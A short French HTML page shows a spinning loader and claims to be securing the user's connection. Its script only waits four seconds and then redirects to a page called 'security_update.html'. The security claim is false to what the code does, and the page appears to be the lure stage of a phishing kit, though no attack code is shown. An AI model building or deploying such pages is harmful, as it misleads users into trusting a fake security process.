<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chargement...</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      color: #333;
      flex-direction: column;
    }

    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #007b76;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    h2 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #333;
    }

    p {
      font-size: 16px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <h2>Nous sécurisons votre connexion.</h2>
  <p>Connexion en cours...</p>

  <script>
    // Redirige après un délai de 4 secondes (4000 millisecondes)
    setTimeout(() => {
        window.location.href = 'security_update.html';
    }, 4000);
</script>
</body>
</html>
